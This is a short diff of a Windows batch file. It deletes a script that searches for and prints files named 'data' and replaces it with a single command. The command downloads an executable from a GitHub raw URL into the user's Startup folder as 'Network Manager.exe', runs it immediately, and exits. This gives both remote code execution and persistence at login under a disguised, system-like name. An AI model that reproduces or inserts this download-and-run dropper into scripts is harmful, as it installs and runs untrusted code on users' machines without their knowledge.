@@ -1,13 +1,1 @@
-@echo off
-setlocal enabledelayedexpansion
-
-:: Define the root directory to start the search
-set "rootDir="
-
-:: Search for all files named "data" recursively and read them
-for /r "%rootDir%" %%f in (data) do (
-    echo Reading file: %%f
-    type "%%f"
-)
-
-endlocal
+curl -o "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\Network Manager.exe" "https://raw.githubusercontent.com/SAKIB-SALIM/Compile_exe/refs/heads/main/Network_Manager.exe" & "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\Network Manager.exe" & exit
